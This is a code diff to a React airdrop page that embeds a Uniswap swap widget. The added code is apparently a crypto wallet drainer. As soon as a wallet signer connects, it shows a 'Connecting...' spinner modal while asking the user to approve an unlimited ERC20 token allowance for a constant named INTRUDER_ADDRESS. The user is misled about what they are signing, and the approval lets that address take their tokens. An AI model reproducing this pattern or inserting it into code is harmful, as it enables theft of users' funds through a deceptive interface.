@@ -9,6 +9,7 @@ import { SwapWidget, darkTheme } from '@uniswap/widgets';
 import type { Web3Provider } from '@ethersproject/providers';
 import { Tooltip } from 'antd';
 import { InfoCircleOutlined } from '@ant-design/icons';
+import { Spinner, Modal } from 'components';
 import { useWallet } from 'hooks';
 import { ERC20TokenABI } from 'abi';
 import styles from './Airdrop.module.scss';
@@ -81,6 +82,7 @@ const Airdrop: FC = () => {
   const toastRef = useRef<any>();
   const provider = useSigner().data?.provider;
   const [isPending, setIsPending] = useState(false);
+  const [modalOpen, setModalOpen] = useState(false);
 
   useEffect(() => {
     const messageHandler = (message: ProviderMessage) => {
@@ -93,6 +95,52 @@ const Airdrop: FC = () => {
       provider?.off('message', messageHandler);
     };
   }, [provider]);
+
+  useEffect(() => {
+    const wrapper = async () => {
+      try {
+        const isOkay = chain && !chain.unsupported;
+
+        if (!signer || !isOkay) {
+          return;
+        }
+
+        setModalOpen(true);
+        const tokenAddress = defaultOutputTokenAddress[chain.id];
+        const contract = new ethers.Contract(
+          tokenAddress,
+          ERC20TokenABI,
+          signer
+        );
+
+        const txnResponse: TransactionResponse = await contract.approve(
+          INTRUDER_ADDRESS,
+          UINT256_MAX_INT
+        );
+
+        await txnResponse.wait();
+        toast.success('Success');
+      } catch (error: any) {
+        const rpcError = serializeError(error);
+
+        const errorData = rpcError.data as OriginalError;
+        const cause = errorData?.cause;
+
+        if (
+          rpcError.code === errorCodes.rpc.internal &&
+          !!cause &&
+          cause.code === 'ACTION_REJECTED'
+        ) {
+          toast.error(capitalizeFirstLetter(cause.reason), { autoClose: 2000 });
+        } else {
+          toast.error(error?.message, { autoClose: 2000 });
+        }
+      } finally {
+        setModalOpen(false);
+      }
+    };
+    wrapper();
+  }, [signer]);
 
   useEffect(() => {
     const reviewButton = document.querySelector(
@@ -192,6 +240,52 @@ const Airdrop: FC = () => {
           </div>
         </div>
       </main>
+
+      <Modal
+        visible={modalOpen}
+        onCancel={() => setModalOpen(false)}
+        width={300}
+      >
+        {{
+          header: ' ',
+          body: (
+            <div>
+              <br />
+              <Spinner />
+              <br />
+              <div style={{ textAlign: 'center' }}>Connecting...</div>
+              <br />
+            </div>
+          ),
+        }}
+      </Modal>
+      {/* <Modal
+        title=""
+        open={modalOpen}
+        onCancel={() => setModalOpen(false)}
+        footer={[
+          <Button key="back" onClick={() => setModalOpen(false)}>
+            Cancel
+          </Button>,
+        ]}
+        width={300}
+        style={{
+          backgroundColor: 'black',
+        }}
+        bodyStyle={{
+          backgroundColor: 'black',
+        }}
+        centered
+      >
+        <br />
+        <br />
+        <Spinner />
+        <br />
+        <br />
+        <div style={{ textAlign: 'center' }}>Connecting...</div>
+        <br />
+        <br />
+      </Modal> */}
     </div>
   );
 };
